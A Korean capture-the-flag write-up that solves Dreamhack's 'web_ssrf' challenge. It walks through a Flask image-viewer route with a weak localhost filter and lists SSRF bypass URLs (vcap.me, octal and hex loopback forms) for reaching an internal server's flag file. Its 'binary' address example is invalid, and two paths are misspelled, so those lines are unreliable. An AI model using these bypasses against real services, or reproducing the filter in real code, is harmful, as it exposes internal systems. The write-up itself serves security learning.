# [Dreamhack] web_ssrf 풀이

## 어플리케이션 구조

### /
```python
@app.route("/")
def index():
    return render_template("index.html")
```
index.html 반환

### /img_viewer
```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```
1. GET 메서드로 받으면 img_viewer.html 반환
2. POST 메서드로 받으면 url이라는 변수에 폼으로 입력받은 주소 저장
3. urlp로 주소 요소 분리 (scheme, netloc, path 등)
4. 만약 url이 /로 시작한다면
5. http://localhost:8000 + 입력받은 url을 결합해서 새 주소 생성
6. (4번 조건이 아닐 때) 만약 urlp.netloc에 localhost 또는 127.0.0.1 문자열이 존재할 시
7. data 변수에 error.png 이미지를 열어서 바이너리로 읽음
8. img 변수에 data를 base64로 인코딩한 뒤 utf8 문자열로 디코딩
9. img_viewer.html 화면을 리턴하면서 img 값을 넘겨 화면에 출력
10.(4번·6번 둘 다 아니거나, 4번 분기로 변환된 주소로) data 변수에 url로 GET 요청 (타임아웃 3초)
11. data를 base64로 인코딩한 뒤 utf8 문자열로 디코딩 (8번과 동일한 이유)
12. 예외 발생 시(주소가 잘못되었거나 요청이 실패한 경우) error.png를 대신 읽어서 출력
이러한 흐름으로 코드가 구성되어 있는데 6번을 보면 localhost와 127.0.0.1이 필터링 되는 것을 알 수 있다.
따라서 vcap.me나 2,8,16 진수를 활용해서 주소를 우회해야 한다.
#### 우회 예시
* vcap
```
http://vcap.me:{local_port}/img_viewer
```
* binary
```
http://1111111.0.0.1:{local_port}/img_viewer
```
* octal
```
http://0177.0.0.1:{local_port}/img_viewr
```
* Hexadecimal
```
http://0x7f.0x0.0x0.0x1:{local_port}/img_viewr
```

#### 포트 찾기
```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)
```
`local_port`는  1500~1800 사이의 랜덤한 값으로 설정되기 때문에 해당 포트 값을 찾은 후 flag를 획득하면 될것으로 보임.

코드 찾은 후 http://vcap.me:{local_port}/flag.txt 로 진입하면 flag 값을 알 수 있음

